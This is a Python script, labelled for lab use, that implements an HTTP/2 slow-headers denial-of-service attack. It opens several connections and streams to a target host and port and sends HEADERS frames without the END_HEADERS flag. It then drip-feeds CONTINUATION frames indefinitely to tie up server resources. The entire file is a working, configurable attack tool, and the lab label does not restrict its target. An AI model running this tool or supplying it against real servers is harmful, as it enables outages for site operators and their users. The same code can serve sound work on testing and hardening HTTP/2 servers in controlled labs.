#!/usr/bin/env python3
"""
Simple HTTP/2 Slow Headers Attack for Lab
Simplified version that exploits CONTINUATION frames without END_HEADERS
"""

import socket
import time
import random
import os
import sys
import struct
import argparse
import logging

class SimpleHTTP2Attack:
    def __init__(self, host, port, connections=3, streams=2, headers_count=10, min_delay=1.0, max_delay=3.0):
        self.host = host
        self.port = port
        self.connections = connections
        self.streams = streams 
        self.headers_count = headers_count
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.running = True
        
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
        self.logger = logging.getLogger(__name__)
    
    def create_http2_frame(self, frame_type, flags, stream_id, payload):
        """Create a simple HTTP/2 frame"""
        length = len(payload)
        header = struct.pack('>I', length)[1:]  # 3-byte length
        header += struct.pack('B', frame_type)  # frame type
        header += struct.pack('B', flags)       # flags  
        header += struct.pack('>I', stream_id & 0x7FFFFFFF)  # stream ID
        return header + payload
    
    def create_settings_frame(self):
        """Create empty SETTINGS frame"""
        return self.create_http2_frame(4, 0, 0, b'')  # SETTINGS frame
    
    def create_settings_ack(self):
        """Create SETTINGS ACK frame"""
        return self.create_http2_frame(4, 1, 0, b'')  # SETTINGS with ACK flag
    
    def encode_header(self, name, value):
        """Simple HPACK header encoding"""
        name_bytes = name.encode('utf-8')
        value_bytes = value.encode('utf-8')
        
        # Literal header field with incremental indexing
        result = b'\x40'
        result += bytes([len(name_bytes)]) + name_bytes
        result += bytes([len(value_bytes)]) + value_bytes
        return result
    
    def connect_http2(self):
        """Establish HTTP/2 connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((self.host, self.port))
        
        # Send HTTP/2 connection preface
        preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        sock.send(preface)
        
        # Send SETTINGS frame
        settings = self.create_settings_frame()
        sock.send(settings)
        
        # Read server response and send ACK
        try:
            response = sock.recv(1024)
            if len(response) > 0:
                ack = self.create_settings_ack()
                sock.send(ack)
                self.logger.info(f"✅ HTTP/2 connection established to {self.host}:{self.port}")
                return sock
        except:
            pass
        
        sock.close()
        return None
    
    def attack_stream(self, sock, stream_id, conn_id):
        """Attack single stream with incomplete headers"""
        try:
            self.logger.info(f"🎯 Connection {conn_id}: Starting attack on stream {stream_id}")
            
            # Create headers
            headers = [
                (':method', 'POST'),
                (':path', '/upload'),  
                (':authority', f'{self.host}:{self.port}'),
                (':scheme', 'http'),
            ]
            
            # Add custom headers
            for i in range(self.headers_count):
                headers.append((f'x-header-{i}', f'value-{i}' * 10))
            
            # Send HEADERS frame WITHOUT END_HEADERS flag (this is the attack!)
            initial_headers = headers[:2]  # Just method and path
            header_block = b''
            for name, value in initial_headers:
                header_block += self.encode_header(name, value)
            
            headers_frame = self.create_http2_frame(1, 0, stream_id, header_block)  # HEADERS, no END_HEADERS
            sock.send(headers_frame)
            self.logger.info(f"📤 Connection {conn_id}: Stream {stream_id} - Sent incomplete HEADERS")
            
            # Send CONTINUATION frames slowly, never completing
            remaining_headers = headers[2:]
            for i, (name, value) in enumerate(remaining_headers):
                if not self.running:
                    break
                    
                # Slow delay
                delay = random.uniform(self.min_delay, self.max_delay)
                time.sleep(delay)
                
                # Send CONTINUATION frame WITHOUT END_HEADERS (keeps attack going)
                header_data = self.encode_header(name, value)
                continuation_frame = self.create_http2_frame(9, 0, stream_id, header_data)  # CONTINUATION, no END_HEADERS
                
                try:
                    sock.send(continuation_frame)
                    self.logger.info(f"⏳ Connection {conn_id}: Stream {stream_id} - CONTINUATION {i+1} sent (incomplete)")
                except:
                    self.logger.warning(f"⚠️  Connection {conn_id}: Stream {stream_id} - Connection lost")
                    return
            
            # Keep connection alive with periodic empty frames
            self.logger.info(f"♾️  Connection {conn_id}: Stream {stream_id} - Maintaining attack...")
            while self.running:
                time.sleep(random.uniform(2, 5))
                try:
                    # Send empty CONTINUATION to keep server waiting
                    empty_continuation = self.create_http2_frame(9, 0, stream_id, b'\x00')
                    sock.send(empty_continuation)
                except:
                    break
                    
        except Exception as e:
            self.logger.error(f"💥 Connection {conn_id}: Stream {stream_id} - Error: {e}")
    
    def attack_connection(self, conn_id):
        """Attack single connection with multiple streams"""
        sock = self.connect_http2()
        if not sock:
            self.logger.error(f"❌ Connection {conn_id}: Failed to establish HTTP/2")
            return
        
        try:
            # Launch attacks on multiple streams
            import threading
            threads = []
            
            for stream_num in range(self.streams):
                stream_id = conn_id * 100 + stream_num * 2 + 1  # Odd stream IDs
                thread = threading.Thread(target=self.attack_stream, args=(sock, stream_id, conn_id))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
                time.sleep(random.uniform(0.5, 1.5))  # Stagger streams
            
            # Wait for streams  
            for thread in threads:
                thread.join()
                
        except Exception as e:
            self.logger.error(f"💥 Connection {conn_id}: Failed - {e}")
        finally:
            sock.close()
    
    def launch_attack(self):
        """Launch the simplified slow headers attack"""
        self.logger.info("🔥" * 20)
        self.logger.info("🔥 SIMPLE HTTP/2 SLOW HEADERS ATTACK")
        self.logger.info("🔥" * 20)
        self.logger.info(f"🎯 Target: {self.host}:{self.port}")
        self.logger.info(f"🔗 Connections: {self.connections}")
        self.logger.info(f"📊 Streams per connection: {self.streams}")
        self.logger.info(f"📝 Headers per request: {self.headers_count}")
        self.logger.info(f"⏱️  Delay: {self.min_delay}-{self.max_delay}s")
        self.logger.info("💀 Attack: Incomplete CONTINUATION frames")
        self.logger.info("🔥" * 20)
        
        # Launch connections
        import threading
        threads = []
        
        for conn_id in range(self.connections):
            thread = threading.Thread(target=self.attack_connection, args=(conn_id,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            time.sleep(random.uniform(1, 2))  # Stagger connections
        
        try:
            # Keep attack running
            while self.running and any(t.is_alive() for t in threads):
                time.sleep(10)
                active = sum(1 for t in threads if t.is_alive())
                self.logger.info(f"📈 Attack status: {active} active connections")
                
        except KeyboardInterrupt:
            self.logger.info("🛑 Attack stopped by user")
            self.running = False

def main():
    parser = argparse.ArgumentParser(description='Simple HTTP/2 Slow Headers Attack')
    
    # Get defaults from environment
    default_host = os.getenv('TARGET_HOST', 'localhost')
    default_port = int(os.getenv('TARGET_PORT', '80'))
    default_connections = int(os.getenv('CONNECTIONS', '3'))
    default_streams = int(os.getenv('STREAMS_PER_CONNECTION', '2'))
    default_headers = int(os.getenv('HEADERS_COUNT', '10'))
    default_min_delay = float(os.getenv('MIN_DELAY', '1.0'))
    default_max_delay = float(os.getenv('MAX_DELAY', '3.0'))
    
    parser.add_argument('--host', default=default_host, help='Target host')
    parser.add_argument('--port', type=int, default=default_port, help='Target port')
    parser.add_argument('--connections', type=int, default=default_connections, help='Number of connections')
    parser.add_argument('--streams', type=int, default=default_streams, help='Streams per connection')
    parser.add_argument('--headers', type=int, default=default_headers, help='Headers per request')
    parser.add_argument('--min-delay', type=float, default=default_min_delay, help='Min delay between frames')
    parser.add_argument('--max-delay', type=float, default=default_max_delay, help='Max delay between frames')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    attack = SimpleHTTP2Attack(
        host=args.host,
        port=args.port,
        connections=args.connections,
        streams=args.streams,
        headers_count=args.headers,
        min_delay=args.min_delay,
        max_delay=args.max_delay
    )
    
    try:
        attack.launch_attack()
    except Exception as e:
        logging.error(f"Attack failed: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())